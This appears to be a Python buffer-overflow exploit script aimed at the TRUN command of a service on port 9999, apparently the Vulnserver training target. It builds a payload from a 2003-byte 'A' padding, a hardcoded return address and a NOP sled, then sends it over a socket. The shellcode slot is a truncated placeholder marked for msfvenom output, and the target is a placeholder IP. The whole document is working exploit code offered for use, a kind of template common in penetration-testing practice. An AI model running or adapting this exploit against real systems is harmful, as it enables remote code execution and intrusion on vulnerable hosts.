#!/usr/bin/python
import sys, socket

overflow = (
b"\xbd\x8e\x6d\xbb\x94\xd9-------------
#REPLACE THIS WITH msfvenom result
)

payload  = b"A" * 2003                 
payload += b"\xaf\x11\x50\x62"          
payload += b"\x90" * 32         
payload += overflow                    

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("WINDOWS_IP", 9999)) #CHANGE THIS 
    s.send(b"TRUN /.:/" + payload)
    s.close()
except:
    print("Error connecting to server")
    sys.exit()

